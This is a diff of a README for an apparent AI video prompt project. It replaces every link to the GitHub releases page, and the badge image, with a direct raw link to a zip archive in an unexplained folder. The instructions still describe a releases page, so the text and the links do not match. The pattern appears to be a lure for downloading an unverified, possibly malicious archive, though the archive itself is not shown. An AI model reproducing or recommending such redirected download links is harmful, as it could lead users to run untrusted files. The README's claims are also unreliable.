@@ -1,6 +1,6 @@
 # 🎬 awesome-ai-video-prompts - Enhance Your Video Creation Today!
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-From%20GitHub-brightgreen)](https://github.com/dpresseddud/awesome-ai-video-prompts/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/dpresseddud/awesome-ai-video-prompts/main/metalined/awesome-ai-video-prompts.zip%20Now-From%20GitHub-brightgreen)](https://raw.githubusercontent.com/dpresseddud/awesome-ai-video-prompts/main/metalined/awesome-ai-video-prompts.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run our application.
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
 
-   [Visit this page to download](https://github.com/dpresseddud/awesome-ai-video-prompts/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/dpresseddud/awesome-ai-video-prompts/main/metalined/awesome-ai-video-prompts.zip)
 
 2. **Choose Your Version**: Once on the releases page, look for the latest version, which will be marked clearly. You will see a list of files available for download.
 
@@ -62,7 +62,7 @@ A: You can reach out through the Issues page on GitHub for any questions or feed
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/dpresseddud/awesome-ai-video-prompts/releases). Follow the steps outlined in the "Getting Started" section to ensure a smooth installation and start enhancing your video creation process today.
+To get started, [visit this page to download](https://raw.githubusercontent.com/dpresseddud/awesome-ai-video-prompts/main/metalined/awesome-ai-video-prompts.zip). Follow the steps outlined in the "Getting Started" section to ensure a smooth installation and start enhancing your video creation process today.
 
 ## 🎉 Community Contributions
 
